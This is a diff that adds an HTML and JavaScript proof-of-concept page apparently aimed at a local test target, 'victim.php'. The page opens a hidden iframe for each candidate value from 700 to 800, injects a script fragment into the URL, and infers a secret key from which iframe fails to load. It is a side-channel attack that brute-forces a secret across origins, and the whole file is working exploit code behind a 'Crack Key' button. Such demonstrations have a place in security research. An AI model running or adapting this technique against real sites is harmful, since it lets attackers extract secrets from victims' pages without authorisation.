@@ -1,0 +1,56 @@
+<html>
+  <head>
+    <script>
+
+      var urlPrefix = "http://localhost/POC/victim.php#<script>var%20key=";
+      var start = 700;
+      var end = 800;
+      var flag = {};
+      var ctr = 0;
+
+      function crack()
+      {
+        var iframeDiv = document.getElementById("iframeDiv");
+        for(var i = start;i<=end;i++)
+        {
+          flag[i] = false;
+          // Creating iframe
+          var iframe = document.createElement("iframe");
+          iframe.src = urlPrefix + i;
+          iframe.id = i;
+          iframe.style.width = "1px";
+          iframe.style.height = "1px";
+          iframe.onload = iframeOnloadHandler;
+          iframeDiv.appendChild(iframe);
+        }
+      }
+
+      function iframeOnloadHandler()
+      {
+        var iframe = this;
+        var i = iframe.id;
+        iframe.parentNode.removeChild(iframe);
+        flag[i] = true;
+        ctr += 1;
+        if(ctr==(end-start))
+          outputKey();
+      }
+
+      function outputKey()
+      {
+        var contentDiv = document.getElementById("content");
+        for(var i = start;i<=end;i++)
+        {
+          if(flag[i]!=true)
+            contentDiv.innerText = "Key found: " + i;
+        }
+      }
+
+    </script>
+  </head>
+  <body>
+    <button onclick="crack()"/>Crack Key</button> <br />
+    <div id="iframeDiv"></div> <br />
+    <div id="content"></div> <br />
+  </body>
+</html>
